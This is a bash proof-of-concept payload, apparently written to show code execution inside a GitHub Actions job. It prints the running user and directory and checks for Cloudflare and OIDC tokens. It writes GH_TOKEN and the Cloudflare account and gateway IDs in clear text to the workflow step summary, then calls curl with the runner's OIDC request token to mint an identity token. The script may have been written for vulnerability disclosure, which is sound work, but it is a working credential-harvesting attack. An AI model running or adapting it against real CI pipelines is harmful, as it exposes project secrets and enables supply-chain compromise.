#!/usr/bin/env bash
{
  echo "POC_RCE_EXECUTED user=$(id -un) pwd=$(pwd)"
  echo "POC_CF_TOKEN_PRESENT=$([ -n "${CLOUDFLARE_API_TOKEN:-}" ] && echo YES || echo no) len=${#CLOUDFLARE_API_TOKEN}"
  echo "POC_CF_ACCOUNT_ID=${CLOUDFLARE_ACCOUNT_ID:-<empty>}"
  echo "POC_CF_GATEWAY=${CLOUDFLARE_GATEWAY_ID:-<empty>}"
  echo "POC_OIDC_REQUEST_TOKEN_PRESENT=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ] && echo YES || echo no)"
  echo "POC_OIDC_REQUEST_URL_PRESENT=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo YES || echo no)"
  echo "POC_GH_TOKEN=${GH_TOKEN:-<empty>}"
  echo "POC_GITHUB_TOKEN_ENV=$([ -n "${GITHUB_TOKEN:-}" ] && echo YES || echo no)"
  echo "POC_JOB_ENV_FILE_VISIBLE=$([ -n "${GITHUB_ENV:-}" ] && echo YES || echo no)"
} | tee -a "${GITHUB_STEP_SUMMARY:-/dev/stdout}"
curl -s --max-time 10 -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-none}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL:-http://127.0.0.1:1}&audience=poc" -o /tmp/oidc.json 2>/dev/null || true
echo "POC_OIDC_MINTED=$([ -s /tmp/oidc.json ] && echo YES || echo no)"
exit 0
